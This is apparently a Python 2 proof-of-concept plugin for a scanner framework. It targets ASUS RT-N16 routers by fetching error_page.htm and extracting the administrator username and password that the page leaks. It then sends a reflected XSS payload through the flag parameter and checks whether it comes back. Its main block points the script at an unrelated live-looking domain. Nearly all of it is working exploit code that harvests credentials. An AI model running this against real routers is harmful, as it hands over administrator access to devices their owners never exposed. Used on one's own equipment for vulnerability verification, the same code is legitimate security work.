#!/usr/bin/env python
# coding: UTF-8

#author: yichin
#name: ASUS RT-N16 - Text-plain Admin Password Disclosure and reflected xss
#refer: https://sintonen.fi/advisories/asus-router-auth-bypass.txt
#description:
'''
asus RT_N16路由器存在管理员密码泄露漏洞，访问http://192.168.1.1/error_page.htm，管理员密码包含在如下的字符串中：
if('1' == '0' || 'password' == 'admin')
'''

import re
import urlparse
from ..miniCurl import Curl
from ..t  import T



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        #admin pass disclosure
        url = arg + 'error_page.htm'
        code,head,res,errcode,_ = curl.curl2(url)
        if code == 200:
            m = re.search(r"if\('1' == '0' \|\| '([\S]*)' == '([\S]*)'", res)
            if m:
                output('Admin Password Disclosure {username}:{password}'.format(username=m.group(2),password=m.group(1)),result,'hole')
    
        #Reflected xss
        url = arg + 'error_page.htm?flag=%27%2balert(%27XSS%27)%2b%27'
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 200 and "casenum = ''+alert('XSS')+'';" in res:
            output(url + ' reflected xss',result,'warning')
        else:
            pass
        

        del curl
        return result


def output(url,result,label):
    info = url + '  asus  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='information Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_f1ceb0edd46d55c9465fb347bf6e282d.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_f1ceb0edd46d55c9465fb347bf6e282d.py
#/root/github/poccreate/codesrc/exp-1826.py